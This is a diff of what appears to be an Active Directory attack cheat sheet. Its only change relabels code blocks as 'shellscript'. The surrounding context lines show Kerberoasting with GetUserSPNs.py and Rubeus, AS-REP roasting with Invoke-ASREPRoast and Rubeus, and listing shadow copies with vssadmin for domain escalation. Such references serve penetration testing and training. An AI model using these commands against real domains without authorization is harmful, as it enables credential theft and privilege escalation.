@@ -67,7 +67,7 @@ python GetUserSPNs.py $DomainName/$DomainUser:$Password -outputfile $Out_File
 
 **Using Rubeus:**
 
-```
+```shellscript
 #Kerberoasting and outputing on a file with a spesific format
 Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName
 
@@ -122,7 +122,7 @@ Invoke-ASREPRoast -Verbose
 
 **Using Rubeus:**
 
-```
+```shellscript
 #For $Format choose either hashcat or john
 
 #Trying the attack for all domain users
@@ -186,7 +186,7 @@ Finally use any tool from before to grab the hash and Kerberoast it!
 
 If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.
 
-```
+```shellscript
 #List shadow copies using vssadmin (Needs Admnistrator Access)
 vssadmin list shadows
 
